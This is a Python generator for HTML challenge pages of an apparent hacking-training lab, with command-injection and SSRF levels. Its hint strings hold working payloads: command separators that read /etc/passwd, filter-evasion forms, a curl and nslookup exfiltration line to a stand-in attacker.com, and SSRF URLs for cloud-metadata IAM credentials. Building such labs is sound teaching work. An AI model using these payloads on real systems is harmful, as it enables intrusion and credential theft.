#!/usr/bin/env python
"""
Command Injection & SSRF Template Generator
Generates all CMDi and SSRF challenge templates with tailored hints
"""

# Command Injection Challenges (condensed for efficiency)
cmdi_challenges = [
    {"level": 1, "title": "Basic Command Injection", "app_name": "PingTool", "url": "ping.local/check", "objective": "Execute system commands via input injection",
     "hints": [
         {"title": "Command Injection Basics", "icon": "lightbulb", "content": "Applications executing system commands with user input are vulnerable. Test with command separators: <code>;</code>, <code>|</code>, <code>&&</code>, <code>||</code>"},
         {"title": "Payload Crafting", "icon": "code-slash", "content": "Try: <code>127.0.0.1; whoami</code> or <code>127.0.0.1 | ls</code> to execute additional commands."},
         {"title": "Solution", "icon": "shield-check", "content": "Enter: <code>127.0.0.1; cat /etc/passwd</code> to execute commands after the ping."}
     ]},
    {"level": 2, "title": "Command Injection with Filters", "app_name": "SystemMonitor", "url": "monitor.local/exec", "objective": "Bypass basic command filters",
     "hints": [
         {"title": "Filter Detection", "icon": "lightbulb", "content": "Test what's blocked: <code>;</code>, <code>|</code>, <code>&</code>, spaces. Find alternatives."},
         {"title": "Bypass Techniques", "icon": "code-slash", "content": "Use: <code>${IFS}</code> for spaces, <code>`command`</code> for execution, <code>$((expression))</code> for arithmetic."},
         {"title": "Solution", "icon": "shield-check", "content": "Bypass filters with: <code>127.0.0.1`whoami`</code> or <code>127.0.0.1${IFS}&&${IFS}id</code>"}
     ]},
    {"level": 3, "title": "Blind Command Injection", "app_name": "BackupService", "url": "backup.local/create", "objective": "Exploit blind command injection",
     "hints": [
         {"title": "Blind Injection", "icon": "lightbulb", "content": "No output visible. Use time delays: <code>; sleep 5</code> or out-of-band techniques."},
         {"title": "Time-based Detection", "icon": "code-slash", "content": "Test: <code>file.txt; sleep 10</code>. If response delays 10 seconds, you have command injection."},
         {"title": "Solution", "icon": "shield-check", "content": "Exfiltrate data: <code>; curl http://attacker.com/$(whoami)</code> or use DNS: <code>; nslookup $(whoami).attacker.com</code>"}
     ]},
]

# Generate remaining CMDi levels (4-23) with varied techniques
for i in range(4, 24):
    techniques = {
        4: ("Command Chaining", "Use multiple separators", "Combine commands with <code>&&</code>, <code>||</code>, <code>;</code>"),
        5: ("Command Substitution", "Use backticks or $()", "Execute: <code>$(whoami)</code> or <code>`id`</code>"),
        6: ("Wildcard Injection", "Exploit glob patterns", "Use wildcards: <code>*</code>, <code>?</code> to manipulate file operations"),
        7: ("Path Traversal in Commands", "Navigate directories", "Use: <code>../../etc/passwd</code> in file parameters"),
        8: ("Environment Variable Injection", "Manipulate env vars", "Inject: <code>PATH=/tmp:$PATH</code> to hijack commands"),
        9: ("Command Injection via Headers", "HTTP header exploitation", "Inject in User-Agent, Referer headers"),
        10: ("Polyglot Command Injection", "Multi-shell payloads", "Craft payloads working in bash, sh, cmd"),
        11: ("Command Injection in Windows", "Windows-specific", "Use: <code>&</code>, <code>&&</code>, <code>|</code>, <code>||</code> for cmd.exe"),
        12: ("PowerShell Injection", "PowerShell exploitation", "Inject PowerShell: <code>; powershell -c whoami</code>"),
        13: ("Command Injection via File Upload", "Malicious file execution", "Upload script and execute via command injection"),
        14: ("Race Condition in Commands", "Timing attacks", "Exploit TOCTOU in command execution"),
        15: ("Command Injection in Cron", "Scheduled task exploitation", "Inject into cron job parameters"),
        16: ("Command Injection via LDAP", "LDAP injection to commands", "LDAP queries leading to command execution"),
        17: ("Command Injection in Docker", "Container escape", "Execute commands to escape Docker container"),
        18: ("Command Injection via Git", "Git command exploitation", "Inject in git operations"),
        19: ("Command Injection in ImageMagick", "Image processing exploit", "Use ImageMagick vulnerabilities"),
        20: ("Command Injection via XML", "XML to command execution", "XML entities executing commands"),
        21: ("Command Injection in Node.js", "child_process exploitation", "Exploit exec(), spawn() in Node.js"),
        22: ("Command Injection in Python", "os.system() exploitation", "Exploit Python command execution"),
        23: ("Advanced Filter Evasion", "Complex bypass techniques", "Combine encoding, obfuscation, alternative syntax")
    }
    
    title, hint2_title, hint2_content = techniques.get(i, ("Advanced Technique", "Exploit technique", "Use advanced methods"))
    cmdi_challenges.append({
        "level": i, "title": title, "app_name": f"App{i}", "url": f"app{i}.local/cmd", "objective": f"Exploit {title.lower()}",
        "hints": [
            {"title": "Understanding the Technique", "icon": "lightbulb", "content": f"This level focuses on {title.lower()}. Research the specific technique."},
            {"title": hint2_title, "icon": "code-slash", "content": hint2_content},
            {"title": "Solution", "icon": "shield-check", "content": f"Apply {title.lower()} techniques to execute commands and retrieve the flag."}
        ]
    })

# SSRF Challenges
ssrf_challenges = [
    {"level": 1, "title": "Basic SSRF", "app_name": "URLFetcher", "url": "fetch.local/get", "objective": "Access internal resources via SSRF",
     "hints": [
         {"title": "SSRF Basics", "icon": "lightbulb", "content": "SSRF allows accessing internal resources. Try: <code>http://localhost</code>, <code>http://127.0.0.1</code>, <code>http://192.168.1.1</code>"},
         {"title": "Internal Services", "icon": "code-slash", "content": "Target common ports: <code>http://localhost:80</code>, <code>http://localhost:8080</code>, <code>http://localhost:3306</code>"},
         {"title": "Solution", "icon": "shield-check", "content": "Access internal admin panel: <code>http://localhost/admin</code> or metadata: <code>http://169.254.169.254/latest/meta-data/</code>"}
     ]},
    {"level": 2, "title": "SSRF with Blacklist Bypass", "app_name": "SecureFetch", "url": "secure.local/proxy", "objective": "Bypass URL blacklists",
     "hints": [
         {"title": "Blacklist Evasion", "icon": "lightbulb", "content": "Blacklists block <code>localhost</code>, <code>127.0.0.1</code>. Use alternatives: <code>127.1</code>, <code>0.0.0.0</code>, <code>[::1]</code>"},
         {"title": "Encoding Techniques", "icon": "code-slash", "content": "Try: <code>http://2130706433</code> (decimal), <code>http://0x7f000001</code> (hex), <code>http://127.0.0.1.nip.io</code>"},
         {"title": "Solution", "icon": "shield-check", "content": "Bypass using: <code>http://127.1</code> or <code>http://localhost.localhost</code> or DNS rebinding"}
     ]},
    {"level": 3, "title": "SSRF to Cloud Metadata", "app_name": "CloudApp", "url": "cloud.local/fetch", "objective": "Access cloud provider metadata",
     "hints": [
         {"title": "Cloud Metadata", "icon": "lightbulb", "content": "AWS: <code>http://169.254.169.254/latest/meta-data/</code>, Azure: <code>http://169.254.169.254/metadata/instance</code>"},
         {"title": "Credential Extraction", "icon": "code-slash", "content": "Get IAM credentials: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>"},
         {"title": "Solution", "icon": "shield-check", "content": "Access metadata service to extract cloud credentials and sensitive information"}
     ]},
]

# Generate remaining SSRF levels (4-23)
for i in range(4, 24):
    techniques = {
        4: ("SSRF via PDF Generation", "Exploit PDF generators", "Inject URLs in PDF generation"),
        5: ("SSRF via SVG", "SVG image processing", "Use SVG with external entities"),
        6: ("SSRF via XXE", "XML external entities", "Combine XXE with SSRF"),
        7: ("SSRF with Protocol Smuggling", "Use alternative protocols", "Try: <code>file://</code>, <code>gopher://</code>, <code>dict://</code>"),
        8: ("SSRF to Redis", "Access Redis instances", "Use gopher protocol to send Redis commands"),
        9: ("SSRF to Internal APIs", "API exploitation", "Access internal REST/GraphQL APIs"),
        10: ("SSRF with DNS Rebinding", "DNS rebinding attack", "Change DNS resolution mid-request"),
        11: ("SSRF via Webhooks", "Webhook exploitation", "Register malicious webhook URLs"),
        12: ("SSRF in File Uploads", "Image processing SSRF", "Upload images with external references"),
        13: ("SSRF via OpenRedirect", "Chain with open redirect", "Combine open redirect and SSRF"),
        14: ("SSRF to SMTP", "Email server access", "Use SSRF to send emails via SMTP"),
        15: ("SSRF to FTP", "FTP server access", "Access internal FTP servers"),
        16: ("SSRF via WebSockets", "WebSocket exploitation", "Exploit WebSocket connections"),
        17: ("SSRF in GraphQL", "GraphQL SSRF", "Exploit GraphQL queries"),
        18: ("SSRF via XSLT", "XSLT processing", "Use XSLT transformations"),
        19: ("SSRF to Elasticsearch", "Database access", "Query Elasticsearch via SSRF"),
        20: ("SSRF to MongoDB", "NoSQL database", "Access MongoDB instances"),
        21: ("SSRF with Time-based Detection", "Blind SSRF", "Use timing to detect internal services"),
        22: ("SSRF via PDF.js", "Client-side SSRF", "Exploit PDF viewers"),
        23: ("Advanced SSRF Chains", "Multi-step exploitation", "Chain multiple SSRF techniques")
    }
    
    title, hint2_title, hint2_content = techniques.get(i, ("Advanced SSRF", "Exploit technique", "Use advanced methods"))
    ssrf_challenges.append({
        "level": i, "title": title, "app_name": f"SSRFApp{i}", "url": f"ssrf{i}.local/fetch", "objective": f"Exploit {title.lower()}",
        "hints": [
            {"title": "Understanding the Technique", "icon": "lightbulb", "content": f"This level focuses on {title.lower()}. Research SSRF in this context."},
            {"title": hint2_title, "icon": "code-slash", "content": hint2_content},
            {"title": "Solution", "icon": "shield-check", "content": f"Apply {title.lower()} to access internal resources and retrieve the flag."}
        ]
    })

def generate_template(challenge, category):
    hints_html = ""
    for i, hint in enumerate(challenge['hints'], 1):
        hints_html += f"""
                <div class="accordion-item">
                    <h2 class="accordion-header">
                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
                            data-bs-target="#hint{i}">
                            <i class="bi bi-{hint['icon']} me-2"></i> Hint {i}: {hint['title']}
                        </button>
                    </h2>
                    <div id="hint{i}" class="accordion-collapse collapse" data-bs-parent="#hintsAccordion">
                        <div class="accordion-body small text-secondary">
                            {hint['content']}
                        </div>
                    </div>
                </div>"""
    
    cat_name = "Command Injection" if category == "cmdi" else "SSRF"
    detected_var = "cmdi_detected" if category == "cmdi" else "ssrf_detected"
    
    template = f"""{{%extends 'base.html' %}}

{{%block title %}}Level {challenge['level']}: {challenge['title']} - R00tGlyph{{%endblock %}}

{{%block breadcrumb %}}
<span class="text-muted">Challenges</span> / <span class="text-muted">{cat_name}</span> / <span>Level {challenge['level']}</span>
{{%endblock %}}

{{%block content %}}
<div class="challenge-lab">
    <div class="mission-panel">
        <div class="mission-header">
            <i class="bi bi-crosshair me-2"></i>Mission Control
        </div>
        <div class="mission-content">
            <h5 class="mb-3">{challenge['title']}</h5>
            <p class="text-secondary small mb-4">
                Welcome to <strong>{challenge['app_name']}</strong>. Test for {cat_name.lower()} vulnerabilities.
            </p>

            <div class="card mb-4 border-0 bg-light">
                <div class="card-body p-3">
                    <h6 class="card-title small text-uppercase text-muted mb-2">Objective</h6>
                    <p class="mb-0 small">{challenge['objective']}</p>
                </div>
            </div>

            <div class="hint-accordion accordion" id="hintsAccordion">{hints_html}
            </div>

            {{%if {detected_var} %}}
            <div class="flag-success mt-4">
                <div class="d-flex align-items-center gap-2 mb-2">
                    <i class="bi bi-check-circle-fill text-success"></i>
                    <strong>Mission Accomplished!</strong>
                </div>
                <p class="small text-secondary mb-2">You've successfully exploited the vulnerability.</p>
                {{%if flag %}}
                <span class="flag-value">{{{{ flag }}}}</span>
                {{%endif %}}
            </div>
            {{%endif %}}
        </div>
    </div>

    <div class="work-panel">
        <div class="browser-bar">
            <div class="d-flex gap-2 text-secondary">
                <i class="bi bi-arrow-left"></i>
                <i class="bi bi-arrow-right"></i>
                <i class="bi bi-arrow-clockwise"></i>
            </div>
            <div class="url-bar">
                <i class="bi bi-lock-fill text-success me-2 small"></i>
                <span>{challenge['url']}</span>
            </div>
        </div>

        <div class="app-frame p-4">
            <p class="text-muted">Challenge interface for {cat_name} Level {challenge['level']}</p>
        </div>
    </div>
</div>
{{%endblock %}}
"""
    return template

if __name__ == '__main__':
    import os
    
    # Generate CMDi templates
    template_dir = 'templates/cmdi'
    os.makedirs(template_dir, exist_ok=True)
    for challenge in cmdi_challenges:
        template_content = generate_template(challenge, "cmdi")
        filename = f"{template_dir}/cmdi_level{challenge['level']}.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(template_content)
        print(f"✅ Generated {filename}")
    
    # Generate SSRF templates
    template_dir = 'templates/ssrf'
    os.makedirs(template_dir, exist_ok=True)
    for challenge in ssrf_challenges:
        template_content = generate_template(challenge, "ssrf")
        filename = f"{template_dir}/ssrf_level{challenge['level']}.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(template_content)
        print(f"✅ Generated {filename}")
    
    print(f"\n✅ Successfully generated {len(cmdi_challenges)} CMDi + {len(ssrf_challenges)} SSRF templates!")
